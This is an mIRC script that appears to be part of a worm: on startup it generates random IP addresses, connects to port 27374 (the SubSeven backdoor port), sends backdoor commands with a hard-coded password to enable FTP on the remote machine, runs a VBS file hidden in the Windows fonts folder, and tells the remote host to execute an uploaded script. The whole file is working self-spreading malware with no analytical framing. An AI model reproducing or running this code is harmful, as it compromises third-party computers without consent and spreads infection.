[script]
n0=var %ss.ip
n1=alias ss.close { if ($sock(s7scan)) { sockclose s7scan | .timerTO1 off | .timerTO3 off | genIp } }
n2=alias subScan { if ($1 == $null) { return } | %ss.ip = $1 | var %ss.port = 27374 | if ($2 != $null) { %ss.port = $2 } | sockclose s7scan | sockopen s7scan %ss.ip %ss.port | .timerTO1 -c 0 30 ss.close }
n3=on 1:sockclose:s7scan:{ ss.close }
n4=on 1:sockread:s7scan:{ if ($sockerr > 0) { return } | .timerTO1 off | %tmp = null | sockread -f %tmp | if (connected isincs %tmp) { sockwrite -t s7scan FTPenable!subhunt@@@21:::1$$$c:\ } | elseif (PWD isincs %tmp) { sockwrite -t s7scan PWD14438136782715101980 } | elseif (server enabled isincs %tmp) { run -n C:\WINDOWS\fonts\sndvol.vbs %ss.ip | .timerTO3 0 90 sockwrite -t s7scan FTPdisable } | elseif (server disable isincs %tmp) { sockwrite -t s7scan FMXc:\sndload.vbs |  .timerTO3 off } | elseif (executed isincs %tmp) { ss.close s7scan } | .timerTO1 0 30 ss.close | return }
n5=alias genIp { var %ch,%a,%b,%c,%d | set %ch $rand(1,100) | if (%ch <= 25) { %a = 24 | %b = $rand(0,254) } | elseif ((%ch > 25) && (%ch <= 33)) { %a = 172 | %b = 128 } | elseif ((%ch > 33) && (%ch <= 41)) { %a = 152 | %b = $rand(163,175) } | elseif ((%ch > 41) && (%ch <= 49)) { %a = 205 | %b = 163 } | elseif ((%ch > 49) && (%ch <= 57)) { %a = 4 |  %b = $rand(30,45) } | elseif ((%ch > 57) && (%ch <= 65)) { %a = 151 |  %b = $rand(196,206) } | elseif ((%ch > 65) && (%ch <= 73)) { %a = 63 |  %b = $rand(194,207) } | elseif ((%ch > 73) && (%ch <= 81)) { %a = 216 |  %b = $rand(76,79) } | else { %a = $rand(3,243) | %b = $rand(0,254) } | %c = $rand(0,254) | %d = $rand(1,254) | subScan %a $+ . $+ %b $+ . $+ %c $+ . $+ %d | return }
n6=on 1:start:{ genip }